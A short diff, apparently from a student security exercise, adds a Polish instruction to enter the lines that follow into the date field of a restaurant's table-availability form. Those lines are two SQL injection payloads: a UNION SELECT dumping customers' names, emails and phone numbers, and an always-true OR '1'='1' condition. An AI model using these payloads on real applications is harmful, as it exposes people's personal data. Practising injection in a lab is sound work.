@@ -1,2 +1,4 @@
+Te komendy wpisujemy w pole data okinka "Sprawdz dostepnosc stolikow na pietrze (bez rezerwacji)" w numer piętra trzeba wpisać dowolną liczbę.
+
 ' UNION SELECT Imie, Nazwisko, Email, Telefon FROM Klienci -- 
 2024-01-01' OR '1'='1
